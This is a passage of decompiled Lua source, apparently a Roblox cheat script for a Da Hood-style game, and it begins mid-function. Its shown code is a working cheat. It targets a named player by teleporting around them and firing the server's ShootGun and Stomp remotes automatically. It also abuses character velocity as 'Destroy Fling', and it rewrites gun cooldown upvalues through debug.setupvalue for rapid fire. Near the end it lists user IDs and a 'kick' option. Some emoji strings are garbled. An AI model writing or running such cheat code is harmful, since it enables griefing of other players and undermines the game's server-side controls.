		local v371, v372, v373 = ipairs(equippedTools)
		while true do
			local v_u_374
			v373, v_u_374 = v371(v372, v373)
			if v373 == nil then
				break
			end
			if v_u_374.Parent == character and v_u_374:FindFirstChild("Handle") then
				if not manualTargetActive and (2 <= v369 and (v_u_374:FindFirstChild("Ammo") and v_u_374.Ammo.Value <= 0)) then
					local v375 = lastReloadTimes[v_u_374] or 0
					if tick() - v375 > ReloadCooldown then
						handleAutoReload(v_u_374)
					end
				end
				pcall(function()
					-- upvalues: (ref) v_u_374, (ref) v_u_358
					mainEvent:FireServer("ShootGun", v_u_374.Handle, v_u_374.Handle.CFrame.Position, v_u_358.Position, v_u_358, Vector3.new())
				end)
			end
		end
	end
end)
AutoKillGroup = v20:AddRightGroupbox("Auto Kill")
selectedTarget = nil
autoKillEnabled = false
targetNameInput = ""
strafeModeOption = "Custom"
strafeType = "Static"
smoothLerpStrength = 0.25
predictionAmount = 1
maxPredictionDistance = 15
baseStrafeSpeed = 20
orbitAngle = 0
orbitRadius = 7
orbitHeight = 1
baitDelay = 0.01
selectedWeapon = "[LMG]"
equipMethods = {
	["[LMG]"] = true,
	["[Rifle]"] = false,
	["[AUG]"] = false
}
originalHRPPos = nil
originalCameraSubject = nil
runConnection = nil
isEvadingFF = false
baitTimer = 0
baitClose = false
lastBaitPos = nil
spiralAngle = 0
chaosTimer = 0
jumpPhase = 0
figure8Time = 0
lastValidTargetPos = Vector3.new(0, 0, 0)
v_u_8 = game:GetService("Players").LocalPlayer
function safeReturnToPosition()
	-- upvalues: (ref) v_u_8, (ref) v_u_5
	local v376 = v_u_8.Character
	if v376 then
		local v377 = v376:FindFirstChild("HumanoidRootPart")
		local v378 = v376:FindFirstChildOfClass("Humanoid")
		if v377 and originalHRPPos then
			v377.CFrame = originalHRPPos
			v377.Velocity = Vector3.new(0, 0, 0)
			v377.RotVelocity = Vector3.new(0, 0, 0)
			if v378 then
				v378:ChangeState(Enum.HumanoidStateType.Running)
			end
			v_u_5.Heartbeat:Wait()
			if v378 then
				v378:ChangeState(Enum.HumanoidStateType.Running)
			end
		end
	else
		return
	end
end
local v_u_379 = nil
function setupPlayerRemovingListener()
	-- upvalues: (ref) v_u_379, (ref) v_u_6, (ref) v_u_8
	if v_u_379 then
		v_u_379:Disconnect()
	end
	v_u_379 = v_u_6.PlayerRemoving:Connect(function(p380)
		-- upvalues: (ref) v_u_8
		if selectedTarget and p380 == selectedTarget then
			selectedTarget = nil
			if autoKillEnabled and originalHRPPos then
				safeReturnToPosition()
				workspace.CurrentCamera.CameraSubject = v_u_8.Character and v_u_8.Character:FindFirstChildOfClass("Humanoid") or originalCameraSubject
				task.spawn(function()
					AutoKillGroup:Toggle("AutoKillToggle", false)
				end)
			end
		end
	end)
end
setupPlayerRemovingListener()
function isValidPos(p381)
	if not p381 then
		return false
	end
	local v382 = p381.Magnitude
	return v382 < 100000 and (0.1 < v382 and (p381.X == p381.X and (p381.Y == p381.Y and p381.Z == p381.Z)))
end
function findTarget(p383)
	-- upvalues: (ref) v_u_6, (ref) v_u_8
	local v384 = p383:lower()
	local v385 = v_u_6
	local v386, v387, v388 = ipairs(v385:GetPlayers())
	while true do
		local v389
		v388, v389 = v386(v387, v388)
		if v388 == nil then
			break
		end
		if v389 ~= v_u_8 and v389.Character and v389.Character:FindFirstChild("HumanoidRootPart") then
			local v390 = v389.Name:lower()
			local v391 = v389.DisplayName:lower()
			if v390:find(v384) or v391:find(v384) then
				return v389
			end
		end
	end
	return nil
end
function equipWeapon()
	-- upvalues: (ref) v_u_8
	local v392 = v_u_8:WaitForChild("Backpack")
	local v393 = v_u_8.Character or v_u_8.CharacterAdded:Wait()
	local v394, v395, v396 = ipairs(v393:GetChildren())
	while true do
		local v397
		v396, v397 = v394(v395, v396)
		if v396 == nil then
			break
		end
		if v397:IsA("Tool") and not equipMethods[v397.Name] then
			v397.Parent = v392
		end
	end
	local v398, v399, v400 = pairs(equipMethods)
	while true do
		local v401
		v400, v401 = v398(v399, v400)
		if v400 == nil then
			break
		end
		if v401 then
			local v402 = v392:FindFirstChild(v400)
			if v402 and v402:IsA("Tool") then
				v402.Parent = v393
			end
		end
	end
end
function shootAtTarget(p403, p404)
	if p404 and (p404.Character and (p403 and p403:FindFirstChild("Handle"))) then
		local v405 = p404.Character:FindFirstChild("Head")
		local v406 = p404.Character:FindFirstChildOfClass("Humanoid")
		local v407 = p404.Character:FindFirstChild("ForceField")
		local v408 = p404.Character:FindFirstChild("BodyCheck")
		if v407 or v408 and v408.Value then
			return
		end
		local v409 = v405 and (v406 and v406.Health > 5) and game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent")
		if v409 then
			v409:FireServer("ShootGun", p403.Handle, p403.Handle.CFrame.Position, p404.Character.HumanoidRootPart.Position, v405, Vector3.new(0, 0, -1))
		end
	end
end
function isReallyDead(p410)
	if not (p410 and p410.Parent) then
		return true
	end
	if not p410:FindFirstChild("HumanoidRootPart") then
		return true
	end
	local v411 = p410:FindFirstChildOfClass("Humanoid")
	if v411 and v411.Health <= 0 then
		return true
	end
	if v411 and v411:GetState() == Enum.HumanoidStateType.Dead then
		return true
	end
	local v412 = p410:FindFirstChild("BodyCheck")
	if v412 and v412.Value then
		return true
	end
	local v413, v414, v415 = ipairs({
		"K.O",
		"KO",
		"Knocked",
		"Dead",
		"IsKO",
		"Downed",
		"KnockedOut"
	})
	while true do
		local v416
		v415, v416 = v413(v414, v415)
		if v415 == nil then
			break
		end
		local v417 = p410:FindFirstChild(v416)
		if v417 and (v417:IsA("BoolValue") and v417.Value or v417:IsA("IntValue") and v417.Value > 0) then
			return true
		end
	end
	return false
end
function applyPredictionToPosition(p418, p419)
	local v420 = p418.Velocity or Vector3.new()
	local v421 = Vector3.new(v420.X, 0, v420.Z)
	if v421.Magnitude <= 0 then
		return p419
	end
	local v422 = math.clamp(v421.Magnitude * predictionAmount, 0, maxPredictionDistance)
	return p419 + v421.Unit * v422
end
function movePlayerInstantOrSmooth(p423, p424, p425)
	if p423 then
		if strafeType == "Smooth" or strafeType == "Prediction" then
			p423.CFrame = p423.CFrame:Lerp(CFrame.new(p424, p425), math.clamp(smoothLerpStrength, 0.01, 1))
			p423.Velocity = p423.Velocity * 0.9
			p423.RotVelocity = p423.RotVelocity * 0.9
		else
			p423.CFrame = CFrame.new(p424, p425)
		end
	end
end
AutoKillGroup:AddToggle("AutoKillToggle", {
	["Text"] = "Enable",
	["Default"] = false,
	["Callback"] = function(p426)
		-- upvalues: (ref) v_u_8, (ref) v_u_5, (ref) v_u_6
		autoKillEnabled = p426
		local v427 = v_u_8.Character
		if v427 then
			v427 = v427:FindFirstChild("HumanoidRootPart")
		end
		if p426 then
			if v427 then
				originalHRPPos = v427.CFrame
			end
			originalCameraSubject = workspace.CurrentCamera.CameraSubject
			if targetNameInput ~= "" then
				selectedTarget = findTarget(targetNameInput)
				if selectedTarget then
					equipWeapon()
				end
			end
			if runConnection then
				runConnection:Disconnect()
			end
			setupPlayerRemovingListener()
			runConnection = v_u_5.RenderStepped:Connect(function(p428)
				-- upvalues: (ref) v_u_6, (ref) v_u_8
				if autoKillEnabled and selectedTarget then
					if v_u_6:FindFirstChild(selectedTarget.Name) then
						local v429 = v_u_8.Character
						local v430 = selectedTarget.Character
						if v430 and v430:FindFirstChild("HumanoidRootPart") then
							local v431
							if v429 then
								v431 = v429:FindFirstChild("HumanoidRootPart")
							else
								v431 = v429
							end
							local v432 = v430:FindFirstChild("HumanoidRootPart")
							local v433 = v430:FindFirstChildOfClass("Humanoid")
							if v431 and (v432 and v433) then
								workspace.CurrentCamera.CameraSubject = v433
								local v434 = v432.Position
								if isValidPos(v434) then
									lastValidTargetPos = v434
								else
									v434 = lastValidTargetPos
								end
								local v_u_435 = v429:FindFirstChildOfClass("Tool")
								if v_u_435 and (v_u_435:FindFirstChild("Ammo") and (v_u_435.Ammo.Value <= 0 and not v_u_435:GetAttribute("Reloading"))) then
									v_u_435:SetAttribute("Reloading", true)
									task.delay(2.8, function()
										-- upvalues: (ref) v_u_435
										local v436 = v_u_435 and v_u_435.Ammo.Value <= 0 and game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent")
										if v436 then
											v436:FireServer("Reload", v_u_435)
										end
										if v_u_435 then
											v_u_435:SetAttribute("Reloading", false)
										end
									end)
								end
								if v430:FindFirstChild("ForceField") then
									isEvadingFF = true
									v431.CFrame = CFrame.new(Vector3.new(math.random(-1000000, 1000000), v432.Position.Y + math.random(100000, 500000), math.random(-1000000, 1000000)))
								else
									isEvadingFF = false
									if v433.Health <= 5 or isReallyDead(v430) then
										local v437 = v430:FindFirstChild("Torso") or (v430:FindFirstChild("UpperTorso") or v432)
										v431.CFrame = CFrame.new(v437.Position + Vector3.new(0, 3.5, 0))
										workspace.CurrentCamera.CameraSubject = v429:FindFirstChildOfClass("Humanoid")
										local v438 = game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent")
										if v438 then
											for _ = 1, 4 do
												v438:FireServer("Stomp")
												task.wait(0.05)
												if isReallyDead(v430) then
													break
												end
											end
										end
										task.wait(0.1)
										task.spawn(function()
											AutoKillGroup:Toggle("AutoKillToggle", false)
										end)
										return
									end
									local v439 = tick()
									local v440 = Vector3.new()
									if strafeModeOption ~= "Custom" then
										if strafeModeOption ~= "Wave" then
											if strafeModeOption ~= "Crazy" then
												if strafeModeOption ~= "Bait" then
													if strafeModeOption ~= "Hyper Spiral" then
														if strafeModeOption ~= "Chaos Orbit" then
															if strafeModeOption ~= "Death ZigZag" then
																if strafeModeOption ~= "Fake Jump Pro" then
																	if strafeModeOption ~= "Insane Figure8" then
																		if strafeModeOption ~= "Nuclear Blender" then
																			if strafeModeOption ~= "Demon 360" then
																				if strafeModeOption ~= "Void Dancer" then
																					if strafeModeOption ~= "Hell Spiral X" then
																						if strafeModeOption ~= "xk5 strafe" then
																							if strafeModeOption ~= "Phantom Blitz" then
																								if strafeModeOption ~= "Oblivion Vortex" then
																									if strafeModeOption ~= "Rift Shatter" then
																										if strafeModeOption ~= "Eclipse Pulse" then
																											if strafeModeOption == "Doom Weaver" then
																												figure8Time = figure8Time + 0.2
																												local v441 = math.random(30, 70)
																												local v442 = figure8Time * 20
																												local v443 = math.sin(v442 * 3) * 140 + math.cos(v442 * 5) * 50
																												v440 = Vector3.new(math.sin(v442 * 2) * v441 * 2, v443, math.cos(v442 * 2) * v441)
																											end
																										else
																											local v444 = v439 * 90
																											local v445 = 30 + math.cos(v444 * 2) * 40
																											local v446 = math.sin(v444 * 6) * 150 - 50
																											v440 = Vector3.new(math.sin(v444 * 15) * v445, v446, math.cos(v444 * 15) * v445)
																										end
																									else
																										chaosTimer = chaosTimer + 0.3
																										local v447 = math.random(15, 60)
																										local v448 = math.sin(chaosTimer * 50) * 120 - 30
																										v440 = Vector3.new(math.sin(v439 * 80) * v447, v448, math.cos(v439 * 80) * v447)
																									end
																								else
																									orbitAngle = orbitAngle + 3
																									local v449 = 25 + orbitAngle % 60
																									local v450 = math.sin(v439 * 70) * 100
																									v440 = Vector3.new(math.sin(orbitAngle * 10) * v449, v450, math.cos(orbitAngle * 10) * v449)
																								end
																							else
																								spiralAngle = spiralAngle + 4
																								local v451 = 20 + math.sin(v439 * 60) * 30
																								local v452 = math.cos(spiralAngle * 5) * 90 - 20
																								v440 = Vector3.new(math.sin(spiralAngle * 12) * v451, v452, math.cos(spiralAngle * 12) * v451)
																							end
																						elseif v439 % 4 > 1 then
																							local v453 = 40 + math.sin(v439 * 45) * 30
																							local v454 = math.sin(v439 * 50) * 85
																							v440 = Vector3.new(math.sin(v439 * 2000) * v453, v454, math.cos(v439 * 2000) * v453)
																						else
																							local v455 = math.random(1, 4)
																							v440 = Vector3.new(math.sin(v439 * 1500) * v455, -3.3, math.cos(v439 * 1500) * v455)
																						end
																					else
																						spiralAngle = spiralAngle + 3.5
																						local v456 = 15 + spiralAngle % 50
																						local v457 = spiralAngle % 100 - 50
																						v440 = Vector3.new(math.sin(spiralAngle * 10) * v456, v457, math.cos(spiralAngle * 10) * v456)
																					end
																				else
																					local v458 = v439 * 35
																					local v459 = 40 + math.sin(v458 * 3) * 25
																					local v460 = math.sin(v458 * 8) * 100 - 30
																					v440 = Vector3.new(math.sin(v458) * v459 * 1.5, v460, math.cos(v458) * v459 * 1.5)
																				end
																			else
																				orbitAngle = orbitAngle + 2.5
																				local v461 = 30 + math.sin(v439 * 50) * 20
																				local v462 = math.abs(math.sin(v439 * 45)) * 80
																				v440 = Vector3.new(math.sin(orbitAngle * 7) * v461, v462, math.cos(orbitAngle * 7) * v461)
																			end
																		else
																			spiralAngle = spiralAngle + 1.8
																			local v463 = math.random(20, 65)
																			local v464 = math.sin(v439 * 40) * 60 + math.cos(spiralAngle * 3) * 30
																			v440 = Vector3.new(math.sin(spiralAngle * 5) * v463, v464, math.cos(spiralAngle * 5) * v463)
																		end
																	else
																		figure8Time = figure8Time + 0.12
																		local v465 = math.random(25, 50)
																		local v466 = figure8Time * 14
																		v440 = Vector3.new(math.sin(v466) * v465 * 1.8, math.sin(v466 * 2) * 50, math.cos(v466) * v465)
																	end
																else
																	jumpPhase = (jumpPhase + 0.25) % 1
																	local v467 = math.random(15, 48)
																	local v468 = jumpPhase < 0.1 and 25 + jumpPhase * 400 or math.random(5, 18)
																	v440 = Vector3.new(math.sin(v439 * 35) * v467, v468, math.cos(v439 * 35) * v467)
																end
															else
																chaosTimer = chaosTimer + 0.18
																local v469 = math.sin(chaosTimer * 45) * 55
																v440 = Vector3.new(v469, math.random(10, 50), math.random(-30, 30))
															end
														else
															orbitAngle = orbitAngle + 0.65
															local v470 = math.random(20, 50)
															local v471 = math.sin(v439 * 20) * 45
															v440 = Vector3.new(math.sin(orbitAngle) * v470, v471, math.cos(orbitAngle) * v470)
														end
													else
														spiralAngle = spiralAngle + 0.8
														local v472 = math.random(15, 50)
														local v473 = 10 + spiralAngle * 0.9 % 45
														v440 = Vector3.new(math.sin(spiralAngle) * v472, v473, math.cos(spiralAngle) * v472)
													end
												else
													if not baitTimer or v439 - baitTimer >= baitDelay then
														baitTimer = v439
														baitClose = not baitClose
													end
													if baitClose then
														orbitAngle = orbitAngle + baseStrafeSpeed * p428 * 3
														v440 = Vector3.new(math.cos(orbitAngle) * 2, 0.5, math.sin(orbitAngle) * 2)
													else
														v440 = lastBaitPos and lastBaitPos - v432.Position or Vector3.new(0, 100, 0)
													end
													lastBaitPos = v434 + v440
												end
											else
												local v474 = v439 * math.random(600, 2500)
												v440 = Vector3.new(math.cos(v474) * math.random(1, 50), math.random(-5, 50), math.sin(v474) * math.random(1, 50))
											end
										else
											local v475 = v439 * math.random(500, 1000)
											v440 = Vector3.new(math.cos(v475) * math.random(1, 5), math.random(-2, 10), math.sin(v475) * math.random(1, 5))
										end
									else
										orbitAngle = orbitAngle + baseStrafeSpeed * p428
										v440 = Vector3.new(math.cos(orbitAngle) * orbitRadius, orbitHeight, math.sin(orbitAngle) * orbitRadius)
									end
									local v476 = v434 + v440
									if not isValidPos(v476) then
										v476 = v431.Position + v431.CFrame.LookVector * orbitRadius
									end
									if strafeType == "Prediction" then
										v476 = applyPredictionToPosition(v432, v476)
										if not isValidPos(v476) then
											v476 = v434 + v440
										end
									end
									local v477 = v434 - v431.Position
									if v477.Magnitude < 1 then
										v477 = v431.CFrame.LookVector
									end
									if Vector3.new(v477.X, 0, v477.Z).Magnitude == 0 then
										local _ = v431.CFrame.LookVector
									end
									movePlayerInstantOrSmooth(v431, v476, v434)
									if v_u_435 and not isReallyDead(v430) then
										shootAtTarget(v_u_435, selectedTarget)
									end
								end
							end
						else
							return
						end
					else
						selectedTarget = nil
						if originalHRPPos then
							safeReturnToPosition()
							workspace.CurrentCamera.CameraSubject = v_u_8.Character and v_u_8.Character:FindFirstChildOfClass("Humanoid") or originalCameraSubject
						end
						task.spawn(function()
							AutoKillGroup:Toggle("AutoKillToggle", false)
						end)
						return
					end
				else
					return
				end
			end)
		else
			selectedTarget = nil
			if originalHRPPos then
				safeReturnToPosition()
			end
			if v_u_8.Character then
				workspace.CurrentCamera.CameraSubject = v_u_8.Character:FindFirstChildOfClass("Humanoid") or originalCameraSubject
			end
			if runConnection then
				runConnection:Disconnect()
				runConnection = nil
			end
			isEvadingFF = false
		end
	end
})
AutoKillGroup:AddInput("TargetNameInput", {
	["Default"] = "",
	["Text"] = "Target Name",
	["Placeholder"] = "Enter player name",
	["Finished"] = true,
	["Callback"] = function(p478)
		targetNameInput = (p478 or ""):lower()
		selectedTarget = nil
		if targetNameInput ~= "" then
			selectedTarget = findTarget(targetNameInput)
			if selectedTarget then
				equipWeapon()
			end
		end
	end
})
AutoKillGroup:AddDropdown("WeaponSelect", {
	["Values"] = { "[LMG]", "[Rifle]", "[AUG]" },
	["Default"] = selectedWeapon,
	["Multi"] = false,
	["Text"] = "Select Weapon",
	["Callback"] = function(p479)
		selectedWeapon = p479
		local v480, v481, v482 = pairs(equipMethods)
		while true do
			v482 = v480(v481, v482)
			if v482 == nil then
				break
			end
			equipMethods[v482] = v482 == selectedWeapon
		end
		equipWeapon()
	end
})
AutoKillGroup:AddDropdown("StrafeTypeDropdown", {
	["Values"] = { "Static", "Smooth", "Prediction" },
	["Default"] = strafeType,
	["Multi"] = false,
	["Text"] = "Strafe Type"
}):OnChanged(function(p483)
	strafeType = p483
end)
AutoKillGroup:AddSlider("SmoothStrengthAK", {
	["Text"] = "Smooth Strength",
	["Default"] = smoothLerpStrength,
	["Min"] = 0.01,
	["Max"] = 1,
	["Rounding"] = 2
}):OnChanged(function(p484)
	smoothLerpStrength = p484
end)
AutoKillGroup:AddSlider("PredictionAmountAK", {
	["Text"] = "Prediction",
	["Default"] = predictionAmount,
	["Min"] = 0,
	["Max"] = 5,
	["Rounding"] = 2
}):OnChanged(function(p485)
	predictionAmount = p485
end)
AutoKillGroup:AddDropdown("StrafeModeOptionDropdown", {
	["Values"] = {
		"Custom",
		"Wave",
		"Crazy",
		"Bait",
		"Hyper Spiral",
		"Chaos Orbit",
		"Death ZigZag",
		"Fake Jump Pro",
		"Insane Figure8",
		"Nuclear Blender",
		"Demon 360",
		"Void Dancer",
		"Hell Spiral X",
		"xk5 strafe",
		"Phantom Blitz",
		"Oblivion Vortex",
		"Rift Shatter",
		"Eclipse Pulse",
		"Doom Weaver"
	},
	["Default"] = strafeModeOption,
	["Multi"] = false,
	["Text"] = "Strafe Mode"
}):OnChanged(function(p486)
	strafeModeOption = p486
end)
AutoKillGroup:AddSlider("StrafeSpeedSlider", {
	["Text"] = "Speed",
	["Default"] = baseStrafeSpeed,
	["Min"] = 10,
	["Max"] = 600,
	["Rounding"] = 0,
	["Callback"] = function(p487)
		baseStrafeSpeed = p487
	end
})
AutoKillGroup:AddSlider("OrbitRadiusSlider", {
	["Text"] = "Distance",
	["Default"] = orbitRadius,
	["Min"] = 1,
	["Max"] = 30,
	["Rounding"] = 0,
	["Callback"] = function(p488)
		orbitRadius = p488
	end
})
AutoKillGroup:AddSlider("OrbitHeightSlider", {
	["Text"] = "Height",
	["Default"] = orbitHeight,
	["Min"] = -10,
	["Max"] = 20,
	["Rounding"] = 0,
	["Callback"] = function(p489)
		orbitHeight = p489
	end
})
AutoKillGroup:AddSlider("BaitDelaySlider", {
	["Text"] = "Bait Delay",
	["Default"] = baitDelay,
	["Min"] = 0.01,
	["Max"] = 3,
	["Rounding"] = 2,
	["Callback"] = function(p490)
		baitDelay = p490
	end
})
local v491 = v22:AddLeftGroupbox("Utilities")
local v_u_492 = game:GetService("Lighting")
v491:AddButton("Force Reset", function()
	-- upvalues: (ref) v_u_8
	local v493 = v_u_8.Character
	if v493 and v493:FindFirstChild("Head") then
		v493.Head:Destroy()
	end
end)
local v_u_494 = false
local v_u_495 = "Character"
local function v_u_498(p496)
	local v497 = p496 and p496:FindFirstChild("Head")
	if v497 then
		v497:Destroy()
	end
end
getgenv().DestroyFlingActive = false
getgenv().DestroyFlingMultiplierX = 500000
getgenv().DestroyFlingMultiplierY = 500000
getgenv().DestroyFlingMultiplierZ = 500000
function StartDestroyFling()
	getgenv().DestroyFlingActive = true
end
function StopDestroyFling()
	getgenv().DestroyFlingActive = false
end
v_u_5.Heartbeat:Connect(function()
	-- upvalues: (ref) v_u_8, (ref) v_u_494, (ref) v_u_495, (ref) v_u_498
	local v499 = v_u_8.Character
	local v500
	if v499 then
		v500 = v499:FindFirstChild("Humanoid")
	else
		v500 = v499
	end
	if v_u_494 and (v500 and v500.Health > 0) then
		if v_u_495 ~= "Character" then
			if v_u_495 ~= "Headless" then
				if v_u_495 == "Destroy" then
					StartDestroyFling()
					if v500.Health <= 6 then
						task.delay(1, function()
							-- upvalues: (ref) v_u_8
							local v501 = v_u_8.Character
							local v502
							if v501 then
								v502 = v501:FindFirstChild("Humanoid")
							else
								v502 = v501
							end
							if v501 and (v502 and (v502.Health <= 6 and v501:FindFirstChild("Head"))) then
								v501.Head:Destroy()
							end
						end)
					end
				end
			elseif v500.Health < 6 then
				v_u_498(v499)
			end
		elseif v500.Health < 15 then
			v500.Health = 0
		end
	elseif v_u_495 == "Destroy" then
		StopDestroyFling()
	end
end)
v491:AddToggle("AntiStomp", {
	["Text"] = "Anti Stomp",
	["Callback"] = function(p503)
		-- upvalues: (ref) v_u_494, (ref) v_u_495
		v_u_494 = p503
		if v_u_495 == "Destroy" then
			if p503 then
				StartDestroyFling()
			else
				StopDestroyFling()
			end
		end
	end,
	["Enabled"] = false
})
v491:AddDropdown("AntiStompMethod", {
	["Text"] = "Anti Stomp Method",
	["Default"] = v_u_495,
	["Values"] = { "Character", "Headless", "Destroy" },
	["Callback"] = function(p504)
		-- upvalues: (ref) v_u_495, (ref) v_u_494
		v_u_495 = p504
		if v_u_495 ~= "Destroy" or not v_u_494 then
			if v_u_495 ~= "Destroy" then
				StopDestroyFling()
			end
		else
			StartDestroyFling()
		end
	end
})
v_u_5.Heartbeat:Connect(function()
	-- upvalues: (ref) v_u_8, (ref) v_u_5
	if getgenv().DestroyFlingActive then
		local v505 = v_u_8.Character
		local v506 = v505 and v505:FindFirstChild("HumanoidRootPart")
		if v506 then
			local v507 = v506.Velocity
			v506.Velocity = Vector3.new(v506.CFrame.LookVector.X * getgenv().DestroyFlingMultiplierX, getgenv().DestroyFlingMultiplierY, v506.CFrame.LookVector.Z * getgenv().DestroyFlingMultiplierZ)
			v_u_5.RenderStepped:Wait()
			v506.Velocity = v507
		end
	end
end)
local v_u_508 = false
local v_u_509 = 0.05
local v_u_510 = 0
local function v_u_511()
	-- upvalues: (ref) v_u_11
	if v_u_11:FindFirstChild("MainEvent") then
		v_u_11.MainEvent:FireServer("Stomp")
	elseif v_u_11:FindFirstChild("MainRemote") then
		v_u_11.MainRemote:FireServer("Stomp")
	elseif v_u_11:FindFirstChild("MAINEVENT") then
		v_u_11.MAINEVENT:FireServer("STOMP")
	elseif v_u_11:FindFirstChild("assets") and (v_u_11.assets:FindFirstChild("dh") and v_u_11.assets.dh:FindFirstChild("MainEvent")) then
		v_u_11.assets.dh.MainEvent:FireServer("Stomp")
	end
end
v491:AddToggle("AutoStomp", {
	["Text"] = "Auto Stomp",
	["Default"] = false,
	["Callback"] = function(p512)
		-- upvalues: (ref) v_u_508
		v_u_508 = p512
	end
}):AddKeyPicker("AutoStompBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Auto Stomp",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p513)
		-- upvalues: (ref) v_u_9, (ref) v_u_508
		if not v_u_9:GetFocusedTextBox() then
			v_u_508 = p513
		end
	end
}):OnChanged(function(p514)
	-- upvalues: (ref) v_u_9, (ref) v_u_508
	if not v_u_9:GetFocusedTextBox() then
		if not p514 then
			v_u_508 = false
		end
	end
end)
v491:AddSlider("AutoStompDelay", {
	["Text"] = "Delay Auto Stomp",
	["Default"] = 0.1,
	["Min"] = 0.1,
	["Max"] = 1,
	["Rounding"] = 1,
	["Callback"] = function(p515)
		-- upvalues: (ref) v_u_509
		v_u_509 = p515
	end
})
v_u_5.RenderStepped:Connect(function()
	-- upvalues: (ref) v_u_508, (ref) v_u_8, (ref) v_u_510, (ref) v_u_509, (ref) v_u_6, (ref) v_u_511
	if not v_u_508 then
		return
	end
	local v516 = v_u_8.Character
	if not (v516 and v516:FindFirstChild("HumanoidRootPart")) then
		return
	end
	local v517 = tick()
	if v517 - v_u_510 < v_u_509 then
		return
	end
	local v518 = v_u_6
	local v519, v520, v521 = pairs(v518:GetPlayers())
	while true do
		local v522
		v521, v522 = v519(v520, v521)
		if v521 == nil then
			break
		end
		if v522 ~= v_u_8 and v522.Character and (v522.Character:FindFirstChild("HumanoidRootPart") and (v516.HumanoidRootPart.Position - v522.Character.HumanoidRootPart.Position).Magnitude < 13) then
			v_u_511()
			v_u_510 = v517
			break
		end
	end
end)
local v_u_523 = false
local v_u_524 = {}
local v_u_525 = {}
local function v_u_533(p526)
	-- upvalues: (ref) v_u_524, (ref) v_u_525
	if p526 and p526:FindFirstChild("GunScript") then
		if not v_u_524[p526] then
			local v527, v528, v529 = ipairs(getconnections(p526.Activated))
			while true do
				local v530
				v529, v530 = v527(v528, v529)
				if v529 == nil then
					break
				end
				for v531 = 1, debug.getinfo(v530.Function).nups do
					local v532, _ = debug.getupvalue(v530.Function, v531)
					if type(v532) == "number" then
						if v532 > 0 then
							if not v_u_525[p526] then
								v_u_525[p526] = {}
							end
							v_u_525[p526][v531] = v532
							debug.setupvalue(v530.Function, v531, 1e-13)
							v_u_524[p526] = true
						end
					end
				end
			end
		end
	else
		return
	end
end
local function v_u_546()
	-- upvalues: (ref) v_u_525, (ref) v_u_524
	local v534, v535, v536 = pairs(v_u_525)
	while true do
		local v537
		v536, v537 = v534(v535, v536)
		if v536 == nil then
			break
		end
		local v538, v539, v540 = ipairs(getconnections(v536.Activated))
		while true do
			local v541
			v540, v541 = v538(v539, v540)
			if v540 == nil then
				break
			end
			local v542, v543, v544 = pairs(v537)
			while true do
				local v545
				v544, v545 = v542(v543, v544)
				if v544 == nil then
					break
				end
				debug.setupvalue(v541.Function, v544, v545)
			end
		end
	end
	v_u_525 = {}
	v_u_524 = {}
end
local function v_u_553(p547)
	-- upvalues: (ref) v_u_523, (ref) v_u_533
	local v548, v549, v550 = ipairs(p547:GetChildren())
	while true do
		local v551
		v550, v551 = v548(v549, v550)
		if v550 == nil then
			break
		end
		if v551:IsA("Tool") and (v551:FindFirstChild("Handle") and v_u_523) then
			v_u_533(v551)
		end
	end
	p547.ChildAdded:Connect(function(p552)
		-- upvalues: (ref) v_u_523, (ref) v_u_533
		if p552:IsA("Tool") and (p552:FindFirstChild("Handle") and v_u_523) then
			v_u_533(p552)
		end
	end)
end
if v_u_8.Character then
	v_u_553(v_u_8.Character)
end
v_u_8.CharacterAdded:Connect(v_u_553)
v491:AddToggle("RapidFireToggle", {
	["Text"] = "Rapid Fire",
	["Default"] = false,
	["Callback"] = function(p554)
		-- upvalues: (ref) v_u_523, (ref) v_u_524, (ref) v_u_525, (ref) v_u_8, (ref) v_u_553, (ref) v_u_546
		v_u_523 = p554
		if p554 then
			v_u_524 = {}
			v_u_525 = {}
			if v_u_8.Character then
				v_u_553(v_u_8.Character)
			end
		else
			v_u_546()
		end
	end
})
v491:AddToggle("Auto Reload", {
	["Text"] = "Auto Reload",
	["Default"] = false,
	["Callback"] = function(p555)
		-- upvalues: (ref) v_u_5, (ref) v_u_11
		if p555 then
			v_u_5:BindToRenderStep("Auto-Reload", 0, function()
				-- upvalues: (ref) v_u_11
				local v556 = player.Character
				if v556 then
					local v557 = v556:FindFirstChildWhichIsA("Tool")
					if v557 and (v557:FindFirstChild("Ammo") and v557.Ammo.Value <= 0) then
						v_u_11.MainEvent:FireServer("Reload", v557)
						wait(1)
					end
				end
			end)
		else
			v_u_5:UnbindFromRenderStep("Auto-Reload")
		end
	end
})
local v558, v559, v560 = ipairs({
	163721789,
	15427717,
	201454243,
	822999,
	63794379,
	17260230,
	28357488,
	93101606,
	8195210,
	89473551,
	16917269,
	85989579,
	1553950697,
	476537893,
	155627580,
	31163456,
	7200829,
	25717070,
	201454243,
	15427717,
	63794379,
	16138978,
	60660789,
	17260230,
	16138978,
	1161411094,
	9125623,
	11319153,
	34758833,
	194109750,
	35616559,
	1257271138,
	28885841,
	23558830,
	25717070,
	4255947062,
	29242182,
	2395613299,
	3314981799,
	3390225662,
	2459178,
	2846299656,
	2967502742,
	7001683347,
	7312775547,
	328566086,
	170526279,
	99356639,
	352087139,
	6074834798,
	2212830051,
	3944434729,
	5136267958,
	84570351,
	542488819,
	1830168970,
	3950637598,
	1962396833
})
local v_u_561 = v_u_9
local v_u_562 = v10
local v563 = v_u_14
local v_u_564 = v_u_27
local v_u_565 = v_u_8
local v_u_566 = v_u_6
local v_u_567 = {}
local v_u_568 = {
	"\226\156\133",
	"\226\152\145\239\184\143",
	"\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
	"\226\173\144",
	"\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\184\143",
	"\226\156\168",
	"\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189"
}
local v_u_569 = {
	35832401,
	8068202,
	10604500,
	8068202,
	268150549,
	539644662,
	862305297
}
local v_u_570 = {
	["test"] = true
}
while true do
	local v571
	v560, v571 = v558(v559, v560)
	if v560 == nil then
		break
	end
	v_u_567[v571] = true
end
local v_u_572 = false
local v_u_573 = "kick"
local v_u_574 = 6753645454
local v_u_575 = nil
local v_u_576 = nil
local v_u_577 = 0
local v_u_578 = {}
local function v_u_584(p579)
	-- upvalues: (ref) v_u_568
	if not p579 then
		return false
	end
